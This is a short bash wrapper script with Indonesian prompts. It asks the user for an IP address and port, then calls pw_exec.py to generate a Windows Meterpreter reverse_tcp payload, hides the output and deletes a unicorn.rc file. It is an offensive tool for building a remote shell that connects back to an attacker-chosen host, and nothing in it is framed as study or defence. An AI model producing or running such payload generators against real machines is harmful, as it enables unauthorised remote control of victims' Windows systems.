#!/usr/bin/env bash

#FMfu


pwned='pw_exec.py'

echo " Masukkan IP anda :"
read ip;
echo " Masukkan PORT ANDA :"
read port;

payload=windows/meterpreter/reverse_tcp

python pw_exec.py $payload $ip $port > /dev/null 2>&1
rm unicorn.rc